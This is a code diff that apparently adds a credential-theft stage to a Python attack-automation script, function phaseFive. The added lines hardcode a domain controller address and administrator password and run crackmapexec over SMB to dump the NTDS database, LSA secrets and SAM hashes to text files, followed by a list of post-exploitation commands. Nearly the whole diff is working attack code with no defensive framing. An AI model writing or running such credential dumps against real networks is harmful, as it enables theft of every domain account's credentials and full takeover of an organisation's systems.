@@ -234,6 +234,19 @@ def phaseFive():
 	DC1 = "208.11.20.100"
 	username = "administrator"
 	password = "P@ssw0rd"
+	# Dump NTDS
+	dump = f"crackmapexec smb {DC1} -u {username} -p {password} --ntds --obfs > dump.txt"
+	lsass = f"crackmapexec smb {DC1} -u {username} -p {password} --lsa --obfs > lsa.txt"
+	sam = f"crackmapexec smb {DC1} -u {username} -p {password} --sam --obfs > sam.txt"
+	print("Dumping NTDS.")
+	subprocess.run(dump, shell=True, text=True)
+	input("Please press enter to continue: ")
+	print("Dumping LSASS.")
+	subprocess.run(lsass, shell=True, text=True)
+	input("Please press enter to continue: ")
+	print("Dumping SAM.")
+	subprocess.run(sam, shell=True, text=True)
+	input("Please press enter to continue: ")
 	# Define the commands you want to execute
 	commands = [
 	"whoami /priv",
